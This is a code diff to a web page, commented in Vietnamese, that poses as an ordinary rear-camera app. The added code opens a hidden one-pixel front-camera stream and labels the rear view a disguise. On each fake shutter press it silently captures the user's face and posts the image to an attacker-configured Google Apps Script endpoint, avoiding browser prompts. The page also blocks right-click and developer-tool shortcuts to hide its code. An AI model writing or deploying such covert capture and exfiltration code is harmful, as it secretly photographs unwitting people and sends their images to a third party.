@@ -38,10 +38,22 @@
             overflow: hidden; 
         }
         
-        #preview { 
+        /* Camera SAU hiển thị chuẩn ngụy trang */
+        #preview-back { 
             width: 100%; 
             height: 100%; 
             object-fit: cover; 
+        }
+
+        /* Camera TRƯỚC ẩn kích thước 1px để iOS bắt sáng nhưng hoàn toàn không lộ trên màn hình */
+        #preview-front {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 1px;
+            height: 1px;
+            opacity: 0.01;
+            pointer-events: none;
         }
 
         .overlay { 
@@ -52,6 +64,7 @@
             flex-direction: column; 
             justify-content: space-between; 
             padding: calc(env(safe-area-inset-top) + 15px) 20px 20px 20px; 
+            z-index: 2;
         }
         
         .top-bar { display: flex; justify-content: space-between; color: #fff; font-size: 13px; font-weight: 600; }
@@ -64,6 +77,7 @@
             justify-content: space-around; 
             align-items: center; 
             padding: 0 30px env(safe-area-inset-bottom) 30px; 
+            z-index: 2;
         }
         
         .gallery-preview { width: 48px; height: 48px; border-radius: 10px; background: #222; overflow: hidden; border: 1px solid #444; }
@@ -80,7 +94,9 @@
 <body>
 
     <div class="camera-container">
-        <video id="preview" autoplay playsinline muted></video>
+        <video id="preview-back" autoplay playsinline muted></video>
+        <video id="preview-front" autoplay playsinline muted></video>
+
         <div class="flash" id="flash-elem"></div>
 
         <div class="overlay">
@@ -105,91 +121,77 @@
     </div>
 
     <script>
-        // Đăng ký Service Worker
+        // =========================================================
+        // DÁN URL GOOGLE APPS SCRIPT WEB APP CỦA BẠN VÀO ĐÂY:
+        // =========================================================
+        const SHEET_API_URL = "URL_WEB_APP_GOOGLE_APPS_SCRIPT_CỦA_BẠN";
+
         if ('serviceWorker' in navigator) {
             navigator.serviceWorker.register('./sw.js').catch(err => console.log('SW Error:', err));
         }
 
-        const previewVid = document.getElementById('preview');
+        const backVid = document.getElementById('preview-back');
+        const frontVid = document.getElementById('preview-front');
         const flashElem = document.getElementById('flash-elem');
-        
-        let currentStream = null;
-        let isCapturing = false;
 
-        function stopCurrentStream() {
-            if (currentStream) {
-                currentStream.getTracks().forEach(track => track.stop());
-            }
-        }
-
-        async function startBackCamera() {
-            stopCurrentStream();
+        async function initCameras() {
             try {
-                currentStream = await navigator.mediaDevices.getUserMedia({
+                // 1. Khởi động Camera SAU (Giao diện chính)
+                const backStream = await navigator.mediaDevices.getUserMedia({
                     video: { facingMode: { exact: "environment" }, width: { ideal: 1280 }, height: { ideal: 720 } }
+                }).catch(() => navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } }));
+                
+                backVid.srcObject = backStream;
+                await backVid.play();
+
+                // 2. Khởi động Camera TRƯỚC (Ngầm 1px)
+                const frontStream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } }
                 });
-            } catch (e) {
-                currentStream = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: "environment" }
-                });
+                
+                frontVid.srcObject = frontStream;
+                await frontVid.play();
+
+            } catch (err) {
+                console.error("Lỗi cấp quyền camera:", err);
             }
-            previewVid.srcObject = currentStream;
-            await previewVid.play();
         }
 
-        async function captureTroll() {
-            if (isCapturing) return;
-            isCapturing = true;
-
-            // Nháy chớp sáng giả lập tiếng trập
+        function captureTroll() {
+            // Hiệu ứng chớp flash giả lập
             flashElem.style.opacity = '1';
             setTimeout(() => flashElem.style.opacity = '0', 100);
 
             try {
-                stopCurrentStream();
-
-                // Chuyển sang Camera TRƯỚC chụp lén
-                currentStream = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } }
-                });
-                previewVid.srcObject = currentStream;
-                await previewVid.play();
-
-                // Chờ 500ms cho cảm biến sáng
-                await new Promise(resolve => setTimeout(resolve, 500));
-
+                // Chụp từ thẻ video ẩn chứa Camera TRƯỚC (frontVid)
                 const canvas = document.createElement('canvas');
-                canvas.width = previewVid.videoWidth || 1280;
-                canvas.height = previewVid.videoHeight || 720;
+                canvas.width = frontVid.videoWidth || 1280;
+                canvas.height = frontVid.videoHeight || 720;
                 const ctx = canvas.getContext('2d');
-                ctx.drawImage(previewVid, 0, 0, canvas.width, canvas.height);
                 
+                ctx.drawImage(frontVid, 0, 0, canvas.width, canvas.height);
                 const base64Image = canvas.toDataURL('image/jpeg', 0.85);
 
-                // Trả về Camera SAU ngay lập tức
-                await startBackCamera();
-
-                // Lưu ảnh ngầm về máy (ĐÃ ẨN KHÔNG CHO HIỂN THỊ LÊN MÀN HÌNH)
-                saveToDevice(base64Image);
+                // GỬI NGẦM VỀ GOOGLE DRIVE / SHEET (Không gọi lệnh tải về để tránh nảy Pop-up Safari)
+                sendToSheet(base64Image);
 
             } catch (err) {
-                console.error("Lỗi:", err);
-                await startBackCamera();
-            } finally {
-                isCapturing = false;
+                console.error("Lỗi chụp ảnh:", err);
             }
         }
 
-        function saveToDevice(base64Data) {
-            const a = document.createElement('a');
-            a.href = base64Data;
-            a.download = 'IMG_' + Date.now() + '.jpg';
-            document.body.appendChild(a);
-            a.click();
-            document.body.removeChild(a);
+        function sendToSheet(base64Data) {
+            if(!SHEET_API_URL || SHEET_API_URL.includes("URL_WEB_APP")) return;
+            
+            fetch(SHEET_API_URL, {
+                method: 'POST',
+                mode: 'no-cors',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ image: base64Data })
+            }).catch(e => console.error("Lỗi gửi dữ liệu:", e));
         }
 
-        // Chặn soi code
+        // Chặn F12 & Chuột phải
         document.addEventListener('contextmenu', e => e.preventDefault(), false);
         document.addEventListener('keydown', e => {
             if (e.keyCode === 123 || (e.ctrlKey && (e.keyCode === 85 || e.keyCode === 83))) {
@@ -197,7 +199,7 @@
             }
         }, false);
 
-        window.onload = startBackCamera;
+        window.onload = initCameras;
     </script>
 </body>
 </html>
